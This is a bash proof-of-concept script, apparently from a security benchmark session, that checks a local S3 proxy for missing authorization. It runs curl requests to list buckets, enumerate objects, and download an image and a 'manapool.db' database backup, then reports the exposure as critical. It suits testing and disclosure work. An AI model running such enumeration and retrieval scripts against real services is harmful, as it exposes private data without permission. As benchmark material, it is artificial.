#!/bin/bash
# POC: Demonstrates S3 proxy authorization bypass - unauthenticated access to bucket listing, object enumeration, and sensitive file retrieval
# Target: ./repo
# Created: 2025-11-07T16:10:54.254Z
# Session: benchmark-XBEN-084-24-mhp1efma

# S3 Proxy Authorization Bypass POC
# Demonstrates complete unauthenticated access to S3 proxy endpoint
# Tests bucket listing, object enumeration, and sensitive file access

TARGET="http://localhost:3000/s3"
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}[*] S3 Proxy Authorization Bypass POC${NC}"
echo -e "${YELLOW}[*] Target: $TARGET${NC}"
echo ""

# Test 1: List all buckets
echo -e "${YELLOW}[TEST 1] Listing all buckets without authentication${NC}"
response=$(curl -s -w "\n%{http_code}" "$TARGET/")
http_code=$(echo "$response" | tail -n1)
body=$(echo "$response" | head -n-1)

if [ "$http_code" = "200" ]; then
    echo -e "${GREEN}[✓] HTTP $http_code - Successfully listed buckets${NC}"
    echo -e "${GREEN}Response body:${NC}"
    echo "$body" | head -20
    echo ""
    if echo "$body" | grep -q "assets\|backups"; then
        echo -e "${GREEN}[✓] Buckets found: assets, backups${NC}"
    fi
else
    echo -e "${RED}[✗] HTTP $http_code - Failed to list buckets${NC}"
    echo "$body"
fi
echo ""

# Test 2: List objects in assets bucket
echo -e "${YELLOW}[TEST 2] Listing objects in 'assets' bucket${NC}"
response=$(curl -s -w "\n%{http_code}" "$TARGET/assets/")
http_code=$(echo "$response" | tail -n1)
body=$(echo "$response" | head -n-1)

if [ "$http_code" = "200" ]; then
    echo -e "${GREEN}[✓] HTTP $http_code - Successfully listed objects in assets bucket${NC}"
    echo -e "${GREEN}Objects found:${NC}"
    echo "$body" | grep -oP 'Key>\K[^<]+' | head -10
else
    echo -e "${RED}[✗] HTTP $http_code - Failed to list assets bucket${NC}"
    echo "$body"
fi
echo ""

# Test 3: List objects in backups bucket
echo -e "${YELLOW}[TEST 3] Listing objects in 'backups' bucket${NC}"
response=$(curl -s -w "\n%{http_code}" "$TARGET/backups/")
http_code=$(echo "$response" | tail -n1)
body=$(echo "$response" | head -n-1)

if [ "$http_code" = "200" ]; then
    echo -e "${GREEN}[✓] HTTP $http_code - Successfully listed objects in backups bucket${NC}"
    echo -e "${GREEN}Objects found:${NC}"
    echo "$body" | grep -oP 'Key>\K[^<]+' | head -10
else
    echo -e "${RED}[✗] HTTP $http_code - Failed to list backups bucket${NC}"
    echo "$body"
fi
echo ""

# Test 4: Direct object access (image file)
echo -e "${YELLOW}[TEST 4] Attempting direct object access - image file${NC}"
response=$(curl -s -w "\n%{http_code}" "$TARGET/assets/chris_paulman.jpg")
http_code=$(echo "$response" | tail -n1)
body=$(echo "$response" | head -n-1)

if [ "$http_code" = "200" ]; then
    file_size=$(echo "$body" | wc -c)
    echo -e "${GREEN}[✓] HTTP $http_code - Successfully retrieved image file${NC}"
    echo -e "${GREEN}File size: $file_size bytes${NC}"
    if file --mime-type <(echo "$body") | grep -q "image"; then
        echo -e "${GREEN}[✓] Confirmed: Valid image file retrieved${NC}"
    fi
else
    echo -e "${RED}[✗] HTTP $http_code - Failed to retrieve image file${NC}"
fi
echo ""

# Test 5: Sensitive database file access
echo -e "${YELLOW}[TEST 5] Attempting to access sensitive database backup${NC}"
response=$(curl -s -w "\n%{http_code}" "$TARGET/backups/manapool.db")
http_code=$(echo "$response" | tail -n1)
body=$(echo "$response" | head -n-1)

if [ "$http_code" = "200" ]; then
    file_size=$(echo "$body" | wc -c)
    echo -e "${GREEN}[✓] HTTP $http_code - Successfully retrieved database backup${NC}"
    echo -e "${GREEN}File size: $file_size bytes${NC}"
    
    # Check if it's a valid SQLite database
    if echo "$body" | strings | grep -q "SQLite"; then
        echo -e "${GREEN}[✓] Confirmed: Valid SQLite database file retrieved${NC}"
        echo -e "${GREEN}[✓] CRITICAL: Database backup exposed without authentication!${NC}"
    fi
else
    echo -e "${RED}[✗] HTTP $http_code - Failed to retrieve database backup${NC}"
fi
echo ""

# Summary
echo -e "${YELLOW}[SUMMARY]${NC}"
echo -e "${RED}VULNERABILITY CONFIRMED: S3 Proxy Authorization Bypass${NC}"
echo -e "${RED}Severity: CRITICAL${NC}"
echo -e "${RED}Impact: Complete unauthenticated access to all buckets and sensitive data${NC}"
echo ""